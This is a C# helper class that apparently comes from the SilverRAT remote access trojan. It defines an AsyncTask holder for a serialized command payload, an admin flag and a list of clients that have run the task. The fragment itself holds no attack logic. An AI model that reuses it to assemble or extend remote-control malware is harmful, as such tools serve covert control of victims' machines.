using System.Collections.Generic;

namespace SilverRAT.Helper;

public class AsyncTask
{
    public byte[] msgPack;

    public string id;

    public bool admin;

    public List<string> doneClient;

    private byte[] vs;

    private string toolTipText;

    public AsyncTask(byte[] vs, string toolTipText)
    {
        this.vs = vs;
        this.toolTipText = toolTipText;
    }

    public AsyncTask(byte[] _msgPack, string _id, bool _admin)
    {
        this.msgPack = _msgPack;
        this.id = _id;
        this.admin = _admin;
        this.doneClient = new List<string>();
    }
}

